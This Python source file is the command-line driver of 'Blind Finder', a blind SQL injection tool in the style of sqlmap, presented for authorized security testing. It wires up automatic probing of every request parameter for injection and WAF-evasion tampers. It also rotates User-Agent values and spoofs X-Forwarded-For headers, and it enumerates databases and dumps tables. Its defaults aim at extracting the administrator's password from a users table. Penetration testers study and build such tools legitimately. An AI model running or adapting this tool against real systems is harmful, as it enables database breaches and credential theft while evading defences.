
"""CLI composition root."""

import argparse
import dataclasses
import logging
import sys
from collections.abc import Sequence
from datetime import datetime, timezone
from pathlib import Path

if __package__ in {None, ""}:
    # Support `python cli/main.py` during development without requiring an
    # editable package installation. Normal usage should prefer `python -m cli`.
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from cli.enum_catalog import (  # noqa: E402
    AVAILABLE_KINDS,
    DUMP_EXTRA_CHARS,
    LIST_EXTRA_CHARS,
    LIST_KINDS,
    ROW_SEPARATOR,
    build_enum_expression,
    build_row_expression,
)
from cli.report import build_report, write_report  # noqa: E402
from cli.request_file import parse_request_file  # noqa: E402
from config import build_attack_engine, calibrate_timing, fingerprint  # noqa: E402
from core.checkpoint import CheckpointStore, compute_session_id  # noqa: E402
from exceptions import BlindFinderError  # noqa: E402
from models.attack import AttackResult, CharacterResult  # noqa: E402
from models.target import AttackConfiguration, Target  # noqa: E402
from payloads import available_profiles, available_tampers, resolve_tampers  # noqa: E402
from ui import (  # noqa: E402
    ExtractionProgress,
    banner,
    config_summary,
    error as ui_error,
    info as ui_info,
    metrics_summary,
    result_table,
    success as ui_success,
    warning as ui_warning,
)
from utils.logging_setup import configure_logging  # noqa: E402


DEFAULT_CHECKPOINT_DIR = Path.home() / ".blind-finder" / "checkpoints"
DEFAULT_CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"


class HelpFormatter(argparse.RawDescriptionHelpFormatter):
    """Formatter with clearer section headings for the command-line help."""

    def start_section(self, heading: str | None) -> None:
        if heading:
            heading = heading.upper()
        super().start_section(heading)


def _key_value(value: str) -> tuple[str, str]:
    key, separator, item = value.partition("=")
    if not separator or not key:
        raise argparse.ArgumentTypeError("expected KEY=VALUE")
    return key, item


def _comma_separated(value: str) -> list[str]:
    return [item.strip() for item in value.split(",") if item.strip()]


def build_parser() -> argparse.ArgumentParser:
    description = """
Blind Finder is an assessment utility for authorized security testing.

Use it only against systems for which you have explicit permission. Supply the
target, the parameter to assess, and the response signal used for detection.
"""

    epilog = """
Examples:
  %(prog)s --url "https://application.example/search" \\
      --parameter tracking --true-text "Welcome back"

  %(prog)s --url "https://application.example/search" \\
      --method POST --location body --parameter search \\
      --body "search=baseline" --detector status --expected-status 200

Tip:
  Run %(prog)s --help before an engagement to review all supported transport,
  detection, extraction, and logging options.
"""

    parser = argparse.ArgumentParser(
        prog="blind-finder",
        description=description,
        epilog=epilog,
        formatter_class=HelpFormatter,
        add_help=False,
    )

    general = parser.add_argument_group("General options")
    general.add_argument(
        "-h",
        "--help",
        action="help",
        help="show this help message and exit",
    )
    general.add_argument(
        "--verbose",
        action="store_true",
        help="enable detailed console logging",
    )
    general.add_argument(
        "--log-file",
        type=Path,
        default=Path("logs/log.log"),
        metavar="PATH",
        help="write detailed logs to PATH (default: logs/log.log)",
    )
    general.add_argument(
        "--resume",
        action="store_true",
        help="resume from a previous checkpoint for this exact configuration, if any",
    )
    general.add_argument(
        "--checkpoint-dir",
        type=Path,
        default=DEFAULT_CHECKPOINT_DIR,
        metavar="PATH",
        help=f"directory for extraction checkpoints (default: {DEFAULT_CHECKPOINT_DIR})",
    )
    general.add_argument(
        "--report-file",
        type=Path,
        metavar="PATH",
        help="write a machine-readable summary of the run to PATH on success",
    )
    general.add_argument(
        "--report-format",
        choices=("json", "csv"),
        default="json",
        help="format for --report-file (default: json)",
    )

    target = parser.add_argument_group("Target and injection point")
    target.add_argument(
        "--url",
        metavar="URL",
        help="target endpoint URL; required unless --request-file is used",
    )
    target.add_argument(
        "-r",
        "--request-file",
        type=Path,
        metavar="PATH",
        help=(
            "raw HTTP request file (Burp 'Copy to file'/'Save item' style); "
            "mark the injection point with a trailing '*' on one query/body/"
            "cookie value, sqlmap-style. Cannot be combined with --url/"
            "--cookie/--header/--query/--body/--method"
        ),
    )
    target.add_argument(
        "--force-ssl",
        action="store_true",
        help="use https:// when building the URL from --request-file (default: http://)",
    )
    target.add_argument(
        "--method",
        choices=("GET", "POST"),
        default="GET",
        help="HTTP method (default: GET)",
    )
    target.add_argument(
        "--parameter",
        metavar="NAME",
        help=(
            "name of the parameter to assess; optional with a '*' marker in "
            "--request-file, or with --technique auto (probes every parameter)"
        ),
    )
    target.add_argument(
        "--location",
        choices=("query", "body", "cookie"),
        default="query",
        help="where the parameter is sent (default: query)",
    )
    target.add_argument(
        "--injection-mode",
        choices=("append", "replace"),
        default="append",
        help="how to insert the payload (default: append)",
    )

    request = parser.add_argument_group("Request data")
    request.add_argument(
        "--query",
        action="append",
        type=_key_value,
        default=[],
        metavar="KEY=VALUE",
        help="query-string value; repeatable",
    )
    request.add_argument(
        "--body",
        action="append",
        type=_key_value,
        default=[],
        metavar="KEY=VALUE",
        help="request-body value; repeatable",
    )
    request.add_argument(
        "--cookie",
        action="append",
        type=_key_value,
        default=[],
        metavar="KEY=VALUE",
        help="cookie value; repeatable",
    )
    request.add_argument(
        "--header",
        action="append",
        type=_key_value,
        default=[],
        metavar="KEY=VALUE",
        help="HTTP header; repeatable",
    )
    request.add_argument(
        "--proxy",
        metavar="URL",
        help="proxy URL for outgoing requests",
    )
    request.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        metavar="SECONDS",
        help="request timeout in seconds (default: 10.0)",
    )
    request.add_argument(
        "--allow-redirects",
        action="store_true",
        help="allow HTTP redirects",
    )
    request.add_argument(
        "--max-retries",
        type=int,
        default=0,
        metavar="COUNT",
        help="number of request retries (default: 0)",
    )
    request.add_argument(
        "--retry-backoff",
        type=float,
        default=0.0,
        metavar="SECONDS",
        help="delay between retries (default: 0.0)",
    )
    request.add_argument(
        "--insecure",
        action="store_true",
        help="disable TLS certificate verification",
    )
    request.add_argument(
        "--rate-limit",
        type=float,
        metavar="REQ_PER_SECOND",
        help="maximum requests per second across all workers (default: unlimited)",
    )

    waf = parser.add_argument_group("WAF evasion")
    waf.add_argument(
        "--tamper",
        type=_comma_separated,
        default=[],
        metavar="NAMES",
        help=(
            "comma-separated tamper names applied to every payload; "
            f"available: {', '.join(available_tampers())}. Heuristic, not a "
            "guarantee against any specific product"
        ),
    )
    waf.add_argument(
        "--tamper-profile",
        choices=available_profiles(),
        metavar="NAME",
        help=(
            "apply a named heuristic combination of tampers "
            f"(available: {', '.join(available_profiles())})"
        ),
    )
    waf.add_argument(
        "--random-agent",
        action="store_true",
        help="rotate the User-Agent header on every request",
    )
    waf.add_argument(
        "--random-xff",
        action="store_true",
        help="randomize X-Forwarded-For/X-Originating-IP/X-Real-IP/X-Client-IP per request",
    )

    enumeration = parser.add_argument_group("Enumeration shortcuts (sqlmap-style)")
    enum_group = enumeration.add_mutually_exclusive_group()
    enum_group.add_argument(
        "--dbs", action="store_true",
        help="list databases (like sqlmap --dbs)",
    )
    enum_group.add_argument(
        "--tables", action="store_true",
        help="list tables; scope with -D (like sqlmap --tables)",
    )
    enum_group.add_argument(
        "--list-columns", action="store_true",
        help="list columns of a table; needs -T, scope with -D",
    )
    enum_group.add_argument(
        "--dump", action="store_true",
        help="extract rows from a table; needs -T, optional -C and --dump-limit",
    )
    enum_group.add_argument(
        "--count", action="store_true",
        help="count rows in a table; needs -T",
    )
    enum_group.add_argument(
        "--current-db", action="store_true",
        help="show current database/schema",
    )
    enum_group.add_argument(
        "--current-user", action="store_true",
        help="show current database user",
    )
    enumeration.add_argument(
        "-D", "--database", metavar="DB", default=None,
        help="database/schema to scope --tables, --list-columns, --dump, --count",
    )
    enumeration.add_argument(
        "-C", "--dump-columns", type=_comma_separated, default=None,
        metavar="COL,COL,...",
        help="columns to include in --dump (default: all)",
    )
    enumeration.add_argument(
        "--dump-limit", type=int, default=10, metavar="N",
        help="maximum rows to extract with --dump (default: 10; must be ≥ 1)",
    )

    extraction = parser.add_argument_group("Extraction settings")
    extraction.add_argument(
        "--expression",
        action="append",
        metavar="SQL",
        help="SQL expression to extract; repeatable (default: --column)",
    )
    extraction.add_argument(
        "--enum",
        action="append",
        choices=AVAILABLE_KINDS,
        default=[],
        metavar="KIND",
        help=(
            "canned enumeration query to extract instead of writing SQL by hand; "
            f"repeatable; one of {', '.join(AVAILABLE_KINDS)}. 'columns' needs --table. "
            "The subquery is built for --dialect and printed before running"
        ),
    )
    extraction.add_argument(
        "--strategy",
        choices=("brute", "binary"),
        default="binary",
        help="character search strategy (default: binary)",
    )
    extraction.add_argument(
        "--charset",
        default=DEFAULT_CHARSET,
        metavar="CHARS",
        help="candidate character set",
    )
    extraction.add_argument(
        "--max-length",
        type=int,
        default=100,
        metavar="COUNT",
        help="maximum extracted value length (default: 100)",
    )
    extraction.add_argument(
        "--delay",
        type=float,
        default=0.0,
        metavar="SECONDS",
        help="delay between requests (default: 0.0)",
    )
    extraction.add_argument(
        "--threads",
        type=int,
        default=1,
        metavar="COUNT",
        help=(
            "parallel workers across expressions; one fresh extractor per "
            "expression, never shared (default: 1). Not supported with "
            "--technique time"
        ),
    )

    technique = parser.add_argument_group("Technique and database settings")
    technique.add_argument(
        "--technique",
        choices=("boolean", "time", "visible-error", "auto"),
        default="boolean",
        help=(
            "assessment technique (default: boolean). 'auto' probes the "
            "injection point first and picks boolean/time/error on its own, "
            "printing what it found before proceeding"
        ),
    )
    technique.add_argument(
        "--attack-mode",
        choices=("conditional-response", "conditional-error", "visible-error"),
        default="conditional-response",
        help="response evaluation mode (default: conditional-response)",
    )
    technique.add_argument(
        "--dialect",
        choices=("oracle", "mysql", "postgres"),
        default=None,
        help=(
            "database dialect (default: oracle). With --technique auto the dialect "
            "is probed automatically; --enum needs it either passed here or detected"
        ),
    )
    technique.add_argument(
        "-T",
        "--table",
        default="users",
        metavar="NAME",
        help="default table name (default: users)",
    )
    technique.add_argument(
        "--column",
        default="password",
        metavar="NAME",
        help="default column or fallback expression (default: password)",
    )
    technique.add_argument(
        "--user-column",
        default="username",
        metavar="NAME",
        help="username column name (default: username)",
    )
    technique.add_argument(
        "--username",
        default="administrator",
        metavar="VALUE",
        help="username value used by supported conditions",
    )
    technique.add_argument(
        "--sleep-seconds",
        type=float,
        metavar="SECONDS",
        help="database delay used by the time-based technique",
    )
    technique.add_argument(
        "--auto-calibrate",
        action="store_true",
        help=(
            "measure real network/response latency before the time-based "
            "attack instead of trusting manually guessed baseline/tolerance"
        ),
    )
    technique.add_argument(
        "--calibration-samples",
        type=int,
        default=5,
        metavar="COUNT",
        help="requests sent to measure timing baseline/jitter (default: 5)",
    )
    technique.add_argument(
        "--calibration-tolerance-factor",
        type=float,
        default=3.0,
        metavar="FACTOR",
        help="multiplies measured jitter (stdev) into the timing tolerance (default: 3.0)",
    )

    detection = parser.add_argument_group("Response detection")
    detection.add_argument(
        "--detector",
        choices=("text", "length", "status", "error", "timing"),
        default="text",
        help="response signal to evaluate (default: text)",
    )
    detection.add_argument(
        "--true-text",
        metavar="TEXT",
        help="text that identifies a positive response",
    )
    detection.add_argument(
        "--expected-length",
        type=int,
        metavar="COUNT",
        help="expected response length",
    )
    detection.add_argument(
        "--expected-status",
        type=int,
        metavar="CODE",
        help="expected HTTP status code",
    )
    detection.add_argument(
        "--error-text",
        metavar="TEXT",
        help="text that identifies an error response",
    )
    detection.add_argument(
        "--error-regex",
        metavar="PATTERN",
        help="regular expression that identifies an error response",
    )
    detection.add_argument(
        "--error-value-regex",
        metavar="PATTERN",
        help="regex used by visible-error mode; must contain a named value group",
    )
    detection.add_argument(
        "--error-status",
        type=int,
        metavar="CODE",
        help="HTTP status code that identifies an error response",
    )
    detection.add_argument(
        "--timing-threshold",
        type=float,
        metavar="SECONDS",
        help="minimum timing difference considered positive",
    )
    detection.add_argument(
        "--timing-baseline",
        type=float,
        default=0.0,
        metavar="SECONDS",
        help="expected baseline response time (default: 0.0)",
    )
    detection.add_argument(
        "--timing-tolerance",
        type=float,
        default=0.0,
        metavar="SECONDS",
        help="allowed timing variation (default: 0.0)",
    )

    return parser




def _candidate_points(target: Target) -> list[tuple[str, str]]:
    """Every injectable (location, name) pair in a target, query→cookie→body."""
    candidates: list[tuple[str, str]] = []
    for name in target.query:
        candidates.append(("query", name))
    for name in target.cookies:
        candidates.append(("cookie", name))
    for name in target.body:
        candidates.append(("body", name))
    return candidates


def _probe_all_parameters(
    configuration: AttackConfiguration, candidates: list[tuple[str, str]]
):
    """Fingerprint each candidate injection point; return the first with a usable
    oracle as ``(FingerprintResult, parameter, location)``.

    Prints one ``[probe]`` line per candidate so the sweep is auditable, and
    raises ``ValueError`` listing every candidate if none expose an oracle.
    """
    for location, name in candidates:
        candidate_config = dataclasses.replace(
            configuration, parameter=name, injection_location=location
        )
        result = fingerprint(candidate_config)
        if result.technique is not None and result.confidence != "none":
            ui_success(
                f"parameter={name} location={location} -> "
                f"{result.technique}/{result.detector} (confidence={result.confidence})"
            )
            return result, name, location
        ui_info(f"parameter={name} location={location} -> no oracle", prefix="probe")
    listed = ", ".join(f"{location}:{name}" for location, name in candidates)
    raise ValueError(f"no injectable parameter found among: {listed}")


def _run_extraction(
    configuration: AttackConfiguration,
    expressions: list[str],
    checkpoint_store: CheckpointStore | None = None,
    session_id: str | None = None,
    resume_map: dict[str, tuple[CharacterResult, ...]] | None = None,
) -> AttackResult:
    """One atomic extraction run — reusable for each step of a --dump flow."""
    progress_tracker = ExtractionProgress(expressions, configuration.max_length)

    def _on_progress(
        expression: str, characters: tuple[CharacterResult, ...], complete: bool
    ) -> None:
        if checkpoint_store is not None and session_id is not None:
            checkpoint_store.save(session_id, expression, characters, complete)
        progress_tracker.update(expression, characters, complete)

    engine = build_attack_engine(configuration, on_progress=_on_progress)
    progress_tracker.start()
    try:
        result = engine.run(expressions, resume=resume_map or {})
    finally:
        progress_tracker.stop()

    return result


def main(argv: Sequence[str] | None = None) -> int:
    banner()
    parser = build_parser()
    args = parser.parse_args(argv)
    configure_logging(verbose=args.verbose, log_file=args.log_file)
    logger = logging.getLogger(__name__)

    if args.request_file and args.url:
        parser.error("--url cannot be combined with --request-file")
    if args.request_file and (args.cookie or args.header or args.query or args.body or args.method != "GET"):
        parser.error(
            "--cookie/--header/--query/--body/--method cannot be combined with --request-file"
        )
    if not args.request_file and not args.url:
        parser.error("one of --url or --request-file is required")

    if args.request_file:
        try:
            parsed = parse_request_file(args.request_file.read_text(), force_ssl=args.force_ssl)
        except (OSError, ValueError) as error:
            parser.error(f"--request-file: {error}")
        target = parsed.target
        if args.parameter:
            parameter, location = args.parameter, args.location
        elif parsed.parameter:
            parameter, location = parsed.parameter, parsed.injection_location
            ui_info(
                f"auto-detected injection point: "
                f"parameter={parameter} location={location}",
                prefix="request-file",
            )
        elif args.technique == "auto":
            parameter, location = None, None  # probe every candidate (see below)
        else:
            parser.error(
                "--request-file has no '*' marker; pass --parameter/--location, "
                "or use --technique auto to probe every parameter"
            )
    else:
        target = Target(
            url=args.url,
            method=args.method,
            headers=dict(args.header),
            cookies=dict(args.cookie),
            query=dict(args.query),
            body=dict(args.body),
        )
        if args.parameter:
            parameter, location = args.parameter, args.location
        elif args.technique == "auto":
            parameter, location = None, None  # probe every candidate (see below)
        else:
            parser.error(
                "--parameter is required (or use --technique auto to probe every parameter)"
            )

    probe_all = parameter is None
    candidates = _candidate_points(target) if probe_all else []
    if probe_all and not candidates:
        parser.error("no query/cookie/body parameters found to probe; pass --parameter")

    session_id: str | None = None
    checkpoint_store: CheckpointStore | None = None
    try:
        tamper_names = list(args.tamper)
        if args.tamper_profile:
            tamper_names.insert(0, args.tamper_profile)
        resolved_tampers = resolve_tampers(tamper_names) if tamper_names else ()

        configuration = AttackConfiguration(
            target=target,
            charset=args.charset,
            timeout=args.timeout,
            verify_ssl=not args.insecure,
            proxy=args.proxy,
            allow_redirects=args.allow_redirects,
            max_retries=args.max_retries,
            retry_backoff=args.retry_backoff,
            delay=args.delay,
            # When probing all parameters the real one is unknown yet; seed with
            # the first candidate (it exists in the request, so the model's
            # non-empty check passes) and overwrite it once probing picks one.
            parameter=parameter if parameter is not None else candidates[0][1],
            injection_location=location if location is not None else candidates[0][0],
            injection_mode=args.injection_mode,
            strategy=args.strategy,
            technique=args.technique,
            detector=args.detector,
            detector_value=args.true_text or "",
            expected_length=args.expected_length,
            expected_status=args.expected_status,
            max_length=args.max_length,
            attack_mode=args.attack_mode,
            dialect=args.dialect or "oracle",
            sleep_seconds=args.sleep_seconds,
            timing_threshold=args.timing_threshold,
            timing_baseline=args.timing_baseline,
            timing_tolerance=args.timing_tolerance,
            table=args.table,
            column=args.column,
            user_column=args.user_column,
            username=args.username,
            error_text=args.error_text,
            error_regex=args.error_regex,
            error_value_regex=args.error_value_regex,
            error_status=args.error_status,
            auto_calibrate=args.auto_calibrate,
            calibration_samples=args.calibration_samples,
            calibration_tolerance_factor=args.calibration_tolerance_factor,
            rate_limit=args.rate_limit,
            max_workers=args.threads,
            resume=args.resume,
            checkpoint_dir=str(args.checkpoint_dir),
            tampers=resolved_tampers,
            random_agent=args.random_agent,
            random_forwarded_for=args.random_xff,
        )

        dialect_known = args.dialect is not None

        if configuration.technique == "auto":
            if probe_all:
                detected, chosen_param, chosen_location = _probe_all_parameters(
                    configuration, candidates
                )
                configuration = dataclasses.replace(
                    configuration, parameter=chosen_param, injection_location=chosen_location
                )
            else:
                logger.info("Fingerprinting injection point (technique/detector auto-detection)...")
                detected = fingerprint(configuration)
            ui_info(
                f"parameter={configuration.parameter} "
                f"location={configuration.injection_location} technique={detected.technique} "
                f"detector={detected.detector} dialect={detected.dialect} "
                f"confidence={detected.confidence}",
                prefix="fingerprint",
            )
            for note in detected.notes:
                ui_info(note, prefix="fingerprint")
            if detected.confidence == "none":
                raise ValueError(
                    "could not fingerprint the injection point automatically; "
                    "configure --technique/--detector manually"
                )
            configuration = dataclasses.replace(
                configuration,
                technique=detected.technique,
                detector=detected.detector or configuration.detector,
                attack_mode=detected.attack_mode or configuration.attack_mode,
                detector_value=detected.detector_value or configuration.detector_value,
                expected_length=(
                    detected.expected_length
                    if detected.expected_length is not None
                    else configuration.expected_length
                ),
                expected_status=(
                    detected.expected_status
                    if detected.expected_status is not None
                    else configuration.expected_status
                ),
                error_regex=detected.error_regex or configuration.error_regex,
                dialect=detected.dialect or configuration.dialect,
                sleep_seconds=(
                    detected.sleep_seconds
                    if detected.sleep_seconds is not None
                    else configuration.sleep_seconds
                ),
                timing_threshold=(
                    detected.timing_threshold
                    if detected.timing_threshold is not None
                    else configuration.timing_threshold
                ),
            )
            if detected.dialect is not None:
                dialect_known = True

        if configuration.technique == "time" and configuration.auto_calibrate:
            logger.info(
                "Calibrating timing baseline (%d sample(s))...",
                configuration.calibration_samples,
            )
            baseline, tolerance = calibrate_timing(configuration)
            logger.info(
                "Calibration complete: baseline=%.3fs tolerance=%.3fs", baseline, tolerance
            )
            configuration = dataclasses.replace(
                configuration, timing_baseline=baseline, timing_tolerance=tolerance
            )

        # --- Enum shortcuts → populate args.enum (Obs. 2 del plan) ---
        if args.dbs:
            args.enum = (args.enum or []) + ["databases"]
        elif args.tables:
            args.enum = (args.enum or []) + ["tables"]
        elif args.list_columns:
            args.enum = (args.enum or []) + ["columns"]
        elif args.current_db:
            args.enum = (args.enum or []) + ["current-db"]
        elif args.current_user:
            args.enum = (args.enum or []) + ["current-user"]
        elif args.count:
            args.enum = (args.enum or []) + ["count"]
        # --dump has its own flow (Fase 2 §2.3), does not go through --enum

        _dump_parsed: list[list[str]] | None = None
        _dump_columns: list[str] | None = None
        _dump_table_name: str | None = None
        _dump_rows_total: int = 0
        _dump_extra_requests: int = 0

        if args.dump:
            if args.dump_limit < 1:
                raise ValueError("--dump-limit must be ≥ 1")
            if not dialect_known:
                raise ValueError(
                    "--dump needs a known database dialect, but none was given or "
                    "detected. Pass --dialect {oracle,mysql,postgres} explicitly "
                    "(auto-detection only fills it for some injection points)."
                )
            if args.expression:
                ui_warning("--expression is ignored when --dump is active")
            dialect = configuration.dialect
            table = args.table
            database = args.database
            columns_specified = args.dump_columns

            config_summary(configuration)
            started_at = datetime.now(timezone.utc)

            # Step 1/3: discover columns (skip if -C given)
            if not columns_specified:
                col_config = configuration
                if col_config.charset == DEFAULT_CHARSET:
                    extra = "".join(c for c in LIST_EXTRA_CHARS if c not in col_config.charset)
                    col_config = dataclasses.replace(col_config, charset=col_config.charset + extra)
                col_expr = build_enum_expression("columns", dialect, table=table, database=database)
                ui_info(f"step 1/3: extracting columns from '{table}'...", prefix="dump")
                result_1 = _run_extraction(col_config, [col_expr])
                if not result_1.extractions[col_expr].complete:
                    ui_warning("column extraction was incomplete; results may be partial")
                columns = [c.strip() for c in result_1.extractions[col_expr].value.split(",") if c.strip()]
                if not columns:
                    raise ValueError(
                        f"no columns discovered for table '{table}'; the table may "
                        "not exist, or --max-length may be too low for the column list"
                    )
                _dump_extra_requests += sum(
                    sum(c.attempts for c in ext.characters)
                    for ext in result_1.extractions.values()
                )
                ui_info(f"columns: {','.join(columns)}", prefix="dump")
            else:
                columns = columns_specified
                ui_info(f"step 1/3: using specified columns: {','.join(columns)}", prefix="dump")

            # Step 2/3: count rows
            count_expr = build_enum_expression("count", dialect, table=table, database=database)
            ui_info(f"step 2/3: counting rows in '{table}'...", prefix="dump")
            result_2 = _run_extraction(configuration, [count_expr])
            count_extraction = result_2.extractions[count_expr]
            if not count_extraction.complete:
                ui_warning("row count extraction was incomplete; results may be inaccurate")
            try:
                rows_total = int(count_extraction.value)
            except ValueError:
                raise ValueError(
                    f"could not parse row count: {count_extraction.value!r}; "
                    "try increasing --max-length or check --charset includes digits"
                )
            _dump_extra_requests += sum(
                sum(c.attempts for c in ext.characters)
                for ext in result_2.extractions.values()
            )
            ui_info(f"rows: {rows_total}", prefix="dump")

            rows_to_extract = min(rows_total, args.dump_limit)
            if rows_to_extract == 0:
                ui_warning("table is empty, nothing to dump")
                result = AttackResult({})
            else:
                # Step 3/3: extract rows (checkpoint-enabled)
                ui_info(
                    f"step 3/3: extracting {rows_to_extract}/{rows_total} rows "
                    f"(--dump-limit {args.dump_limit})...",
                    prefix="dump",
                )
                row_expressions = [
                    build_row_expression(dialect, columns, table=table, database=database, offset=n)
                    for n in range(rows_to_extract)
                ]

                dump_config = configuration
                if dump_config.charset == DEFAULT_CHARSET:
                    extra = "".join(c for c in DUMP_EXTRA_CHARS if c not in dump_config.charset)
                    dump_config = dataclasses.replace(dump_config, charset=dump_config.charset + extra)

                checkpoint_store = CheckpointStore(Path(dump_config.checkpoint_dir))
                session_id = compute_session_id(dump_config, row_expressions)

                resume_map: dict[str, tuple[CharacterResult, ...]] = {}
                if dump_config.resume:
                    stored = checkpoint_store.load(session_id)
                    if stored:
                        resume_map = {
                            expr: tuple(
                                CharacterResult.from_dict(item)
                                for item in data["characters"]
                            )
                            for expr, data in stored.items()
                            if expr in row_expressions
                        }
                        if resume_map:
                            logger.info("Resuming %d row(s) from checkpoint", len(resume_map))

                result = _run_extraction(
                    dump_config, row_expressions,
                    checkpoint_store, session_id, resume_map,
                )

                if all(ext.complete for ext in result.extractions.values()):
                    checkpoint_store.clear(session_id)

                _dump_parsed = [
                    result.extractions[expr].value.split(ROW_SEPARATOR)
                    for expr in row_expressions
                ]
                _dump_columns = columns
                _dump_table_name = table
                _dump_rows_total = rows_total

            finished_at = datetime.now(timezone.utc)

            if args.report_file:
                report = build_report(configuration, result, started_at=started_at, finished_at=finished_at)
                write_report(report, args.report_file, args.report_format)
                logger.info("Report written to %s", args.report_file)

        else:
            if args.enum:
                if not dialect_known:
                    raise ValueError(
                        "--enum needs a known database dialect, but none was given or "
                        "detected. Pass --dialect {oracle,mysql,postgres} explicitly "
                        "(auto-detection only fills it for some injection points)."
                    )
                enum_expressions = []
                for kind in args.enum:
                    expression = build_enum_expression(
                        kind, configuration.dialect,
                        table=args.table, database=args.database,
                    )
                    ui_info(f"{kind}: {expression}", prefix="enum")
                    enum_expressions.append(expression)
                expressions = (args.expression or []) + enum_expressions

                if any(kind in LIST_KINDS for kind in args.enum) and configuration.charset == DEFAULT_CHARSET:
                    extra = "".join(c for c in LIST_EXTRA_CHARS if c not in configuration.charset)
                    extended = configuration.charset + extra
                    ui_info(f"extended charset for list output with: {extra!r}", prefix="enum")
                    configuration = dataclasses.replace(configuration, charset=extended)
            else:
                expressions = args.expression or [args.column]
            checkpoint_store = CheckpointStore(Path(configuration.checkpoint_dir))
            session_id = compute_session_id(configuration, expressions)

            resume_map: dict[str, tuple[CharacterResult, ...]] = {}
            if configuration.resume:
                stored = checkpoint_store.load(session_id)
                if stored:
                    resume_map = {
                        expression: tuple(
                            CharacterResult.from_dict(item) for item in data["characters"]
                        )
                        for expression, data in stored.items()
                        if expression in expressions
                    }
                    if resume_map:
                        logger.info(
                            "Resuming %d expression(s) from a previous checkpoint", len(resume_map)
                        )

            config_summary(configuration)

            started_at = datetime.now(timezone.utc)
            result = _run_extraction(
                configuration, expressions,
                checkpoint_store, session_id, resume_map,
            )
            finished_at = datetime.now(timezone.utc)

            if all(extraction.complete for extraction in result.extractions.values()):
                checkpoint_store.clear(session_id)

            if args.report_file:
                report = build_report(configuration, result, started_at=started_at, finished_at=finished_at)
                write_report(report, args.report_file, args.report_format)
                logger.info("Report written to %s", args.report_file)
    except KeyboardInterrupt:
        ui_warning("Attack interrupted by user")
        if checkpoint_store is not None and session_id is not None:
            ui_warning(
                f"Progress saved under checkpoint {session_id}; re-run with --resume to continue"
            )
        return 130
    except (BlindFinderError, KeyError, TypeError, ValueError) as exc:
        ui_error(f"Attack could not be completed: {exc}")
        logger.error("Attack could not be completed: %s", exc)
        return 2

    if _dump_parsed is not None and _dump_columns is not None:
        ui_success(f"dump: {_dump_table_name} ({len(_dump_parsed)}/{_dump_rows_total} rows)")
        header = " | ".join(_dump_columns)
        ui_info(header, prefix="dump")
        ui_info("-" * len(header), prefix="dump")
        for row in _dump_parsed:
            ui_info(" | ".join(row), prefix="dump")
    else:
        result_table(result)

    duration = (finished_at - started_at).total_seconds()
    total_requests = _dump_extra_requests + sum(
        sum(c.attempts for c in ext.characters)
        for ext in result.extractions.values()
    )
    metrics_summary(duration, total_requests, len(result.extractions))

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
